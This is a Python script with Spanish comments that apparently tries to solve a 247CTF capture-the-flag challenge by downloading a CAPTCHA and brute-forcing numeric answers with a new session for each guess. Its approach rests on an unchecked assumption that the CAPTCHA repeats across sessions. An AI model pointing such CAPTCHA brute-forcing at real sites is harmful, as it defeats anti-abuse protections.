#!/usr/bin/env python3
import requests
import re

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

session = requests.Session()
session.get(BASE_URL)

# Descargar UN CAPTCHA y guardarlo
img_response = session.get(BASE_URL + "mturk.php")
with open('/workspace/single_captcha.png', 'wb') as f:
    f.write(img_response.content)

print("CAPTCHA guardado. Ahora probando respuestas...")

# Probar un rango de respuestas
for answer in range(1, 2000000, 50000):
    # Crear NUEVA sesión para cada intento
    test_session = requests.Session()
    test_session.get(BASE_URL)
    
    # Descargar el MISMO captcha (debería ser el mismo)
    test_session.get(BASE_URL + "mturk.php")
    
    # Enviar respuesta
    data = {"captcha": str(answer)}
    response = test_session.post(BASE_URL, data=data)
    
    if "invalid" not in response.text.lower():
        print(f"Respuesta {answer}: No es inválida!")
        if "correct" in response.text.lower() or "flag" in response.text.lower():
            print(f"✓✓✓ CORRECTO: {answer}")
            print(response.text[:1000])
            break
    elif answer % 200000 == 1:
        print(f"Probado hasta {answer}...")
